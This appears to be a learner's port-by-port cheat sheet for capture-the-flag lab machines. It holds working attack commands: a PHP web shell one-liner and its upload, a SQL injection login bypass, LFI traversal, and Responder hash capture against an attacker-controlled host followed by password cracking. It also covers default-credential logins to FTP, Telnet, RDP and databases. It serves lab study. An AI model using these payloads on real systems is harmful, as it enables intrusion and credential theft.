nmap -sV {ipaddress} -Pn
nmap -p- --min-rate=1000 -sV {ip}

PORT 21 - FTP
    running nmap with -sC will check to see if anon ftp login is allowed

    ftp {ipaddress}
        login with anonymous, anon123
        ls to list files.
        get flag.txt to download

PORT 23 - TELNET
    telnet {ipaddress}
        login via typical users (admin, administrator, root)
        use ls, cd to navigate. cat to show .txt files

PORT 80 - HTTP
    gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {ipaddress} initiate dir busting attack using wordlist to find hidden directories
    login via basic user/pass (admin,admin) ect..

    gobuster dir -u http://{ipaddress}/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-small.txt -x php,html
    dir busting attack looking for php and html pages as these are most common
        login.php can be brute forced or use credentials downloaded from ftp ect..

    gobuster vhost -w subdomains-top1million-5000.txt -u http://domain.htb --append-domain
        this can be used to find subdomains of sites, ie: s3.thetoppers.htb
        sites like this may need to be associated to their server ip using the following
            echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
        s3 subdomains are AWS related and could be interacted with using the awscli with the following:
            aws --endpoint=http://s3.domain.htb s3 ls
            aws --endpoint=http://s3.domain.htb s3 ls s3://thetoppers.htb
                if this shows a .php file we can create a php one liner and use aws to upload
                    echo '<?php system($_GET["cmd"]); ?>' > shell.php
                then upload with aws using the following: 
                aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
            going to the site http://thetoppers.htb/shell.php?cmd=ls we can see shell.php and the upload worked
            use burpsuite
                navigate to site and in proxy/webhistory send to repeater
                verify request by modifying line 1 GET /shell.php?cmd=ls    response should show shell.php listed
                inject cmd commands with this line using ls to navigate to find target  example: GET /shell.php?cmd=ls+../
                read files using cat command    example: GET /shell.php?cmd=cat+../flag.txt HTTP/1.1

    when a page has a login page can attempt SQL Injection using
        Username = admin'#
        Password = abc123 or anything

    when a page includes a page=*.html page it could be vulnerable to Local File Inclusion (LFI) and have access to the system files
        following "page=" insert the following "../../../../../../../../windows/system32/drivers/etc/hosts"
        example: http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

        since the page is vulnerable to Inclusion and on a windows machine we can utilize SMB and capture the NetNTLMv2 when it attempts to auth.
            run Responder "sudo python3 Responder.py -I tun0" once running,
            send the page a request, example: "http://unika.htb/?page=//10.10.14.25/somefile" the 10.10 ip will be listed in Responer as "Responder IP" make sure that is updated
            the Responder server should receive a encrypted responce from the webpage, save the responce to a hash.txt file "echo "responder responce" > hash.txt"
            pass the hash to "john" and crack the password "john -w=/usr/share/wordlists/rockyou.txt hash.txt"
            use Evil-WinRM to connect "evil-winrm -i {ipaddress} -u administrator -p badminton"
            navigate using powershell commands. get-content to read txt files


PORT 445 - SMB
    smbclient - L {ipaddress} to list shares
    smbclient \\\\{ip}\\{share} to attempt to connect
        once connected to share use ls,cd,get to nav and download

PORT 873 - RSYNC
    rsync --list-only {target_IP}:: use this to interact with remote and list shares
        include shares in initial command to navigate. ie..  rsync --list-only {target_IP}::public
        to download file remove list-only from command and add file name and list desitation file name. ie.. rsync {target_IP}::public/flag.txt flag.txt

PORT 3306 - MYSQL
    mysql -h {ipaddress} -u root ## attempt to connect to host as root
        show databases; lists all databases
        use {database name}; selects database
        show tables; lists tables in database
        select * from {table}; lists contents of table

PORT 3389 - RDP
    xfreerdp /v:{ipaddress} /cert:ignore /u:Administrator to attempt to connect to rdp host ignoring certs and logging in as admin
        use blank password or usuals


PORT 6379 - REDIS
    redis-cli -h {ipaddress}

        in #Keyspace db0: has keys=4. that is the data
        "select 0" to select db0
        "keys *" to list the keys
        "get {key name}" to show the key

PORT 27017 - MONGODB
    ./mongo mongodb://{target_IP}:27017 run in folder with mongodb/bin to attempt to connect to db
        show dbs; - to show databases
        use {database name}; to select DB
        show collections; - to list info in DB
        db.flag.find().pretty(); to dump the contents of th DM


OTHER:
    echo "{ipaddress} {domain}" | sudo tee -a /etc/hosts    example: echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
        resolve a hostname into an IP address 